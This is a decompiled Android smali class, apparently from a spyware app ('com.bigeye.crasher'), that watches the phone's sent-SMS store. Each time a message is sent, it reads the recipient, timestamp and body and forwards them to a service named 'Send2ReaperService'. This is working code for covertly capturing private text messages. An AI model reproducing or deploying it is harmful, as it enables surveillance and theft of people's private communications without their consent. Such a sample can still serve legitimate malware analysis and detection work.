.class Lcom/bigeye/crasher/MonitorOutgoingSMS$1;
.super Landroid/database/ContentObserver;
.source "MonitorOutgoingSMS.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/bigeye/crasher/MonitorOutgoingSMS;->onResume()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/bigeye/crasher/MonitorOutgoingSMS;


# direct methods
.method constructor <init>(Lcom/bigeye/crasher/MonitorOutgoingSMS;Landroid/os/Handler;)V
    .locals 0
    .param p1, "this$0"    # Lcom/bigeye/crasher/MonitorOutgoingSMS;
    .param p2, "x0"    # Landroid/os/Handler;

    .prologue
    .line 36
    iput-object p1, p0, Lcom/bigeye/crasher/MonitorOutgoingSMS$1;->this$0:Lcom/bigeye/crasher/MonitorOutgoingSMS;

    invoke-direct {p0, p2}, Landroid/database/ContentObserver;-><init>(Landroid/os/Handler;)V

    return-void
.end method


# virtual methods
.method public deliverSelfNotifications()Z
    .locals 1

    .prologue
    .line 67
    const/4 v0, 0x1

    return v0
.end method

.method public onChange(Z)V
    .locals 13
    .param p1, "selfChange"    # Z

    .prologue
    .line 39
    const-string v0, "content://sms/sent"

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    .line 40
    .local v1, "smsURI":Landroid/net/Uri;
    iget-object v0, p0, Lcom/bigeye/crasher/MonitorOutgoingSMS$1;->this$0:Lcom/bigeye/crasher/MonitorOutgoingSMS;

    invoke-virtual {v0}, Lcom/bigeye/crasher/MonitorOutgoingSMS;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const/4 v2, 0x3

    new-array v2, v2, [Ljava/lang/String;

    const/4 v3, 0x0

    const-string v4, "address"

    aput-object v4, v2, v3

    const/4 v3, 0x1

    const-string v4, "date_sent"

    aput-object v4, v2, v3

    const/4 v3, 0x2

    const-string v4, "body"

    aput-object v4, v2, v3

    const/4 v3, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v7

    .line 43
    .local v7, "c":Landroid/database/Cursor;
    const/4 v0, 0x3

    new-array v8, v0, [Ljava/lang/String;

    const/4 v0, 0x0

    const-string v2, "address"

    aput-object v2, v8, v0

    const/4 v0, 0x1

    const-string v2, "date_sent"

    aput-object v2, v8, v0

    const/4 v0, 0x2

    const-string v2, "body"

    aput-object v2, v8, v0

    .line 46
    .local v8, "columns":[Ljava/lang/String;
    invoke-interface {v7}, Landroid/database/Cursor;->moveToNext()Z

    .line 48
    const/4 v0, 0x0

    aget-object v0, v8, v0

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v10

    .line 49
    .local v10, "dest":Ljava/lang/String;
    const/4 v0, 0x1

    aget-object v0, v8, v0

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v9

    .line 50
    .local v9, "date":Ljava/lang/String;
    const/4 v0, 0x2

    aget-object v0, v8, v0

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v12

    .line 52
    .local v12, "smsContent":Ljava/lang/String;
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "sms to :"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, ": "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, ": "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    new-instance v2, Ljava/sql/Date;

    invoke-static {v9}, Ljava/lang/Integer;->getInteger(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Integer;->intValue()I

    move-result v3

    int-to-long v3, v3

    invoke-direct {v2, v3, v4}, Ljava/sql/Date;-><init>(J)V

    invoke-virtual {v2}, Ljava/sql/Date;->toLocaleString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    .line 55
    .local v11, "finalText":Ljava/lang/String;
    iget-object v0, p0, Lcom/bigeye/crasher/MonitorOutgoingSMS$1;->this$0:Lcom/bigeye/crasher/MonitorOutgoingSMS;

    invoke-virtual {v0}, Lcom/bigeye/crasher/MonitorOutgoingSMS;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const/4 v2, 0x1

    invoke-static {v0, v11, v2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v0

    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    .line 56
    iget-object v0, p0, Lcom/bigeye/crasher/MonitorOutgoingSMS$1;->this$0:Lcom/bigeye/crasher/MonitorOutgoingSMS;

    iget-object v0, v0, Lcom/bigeye/crasher/MonitorOutgoingSMS;->APP_TAG:Ljava/lang/String;

    invoke-static {v0, v11}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 59
    new-instance v6, Landroid/content/Intent;

    iget-object v0, p0, Lcom/bigeye/crasher/MonitorOutgoingSMS$1;->this$0:Lcom/bigeye/crasher/MonitorOutgoingSMS;

    invoke-virtual {v0}, Lcom/bigeye/crasher/MonitorOutgoingSMS;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-class v2, Lcom/bigeye/crasher/Send2ReaperService;

    invoke-direct {v6, v0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 60
    .local v6, "SvcIntent":Landroid/content/Intent;
    const-string v0, "OPERATION"

    const-string v2, "OUTGOING"

    invoke-virtual {v6, v0, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 61
    const-string v0, "MSG"

    invoke-virtual {v6, v0, v11}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 62
    iget-object v0, p0, Lcom/bigeye/crasher/MonitorOutgoingSMS$1;->this$0:Lcom/bigeye/crasher/MonitorOutgoingSMS;

    invoke-virtual {v0, v6}, Lcom/bigeye/crasher/MonitorOutgoingSMS;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 63
    return-void
.end method
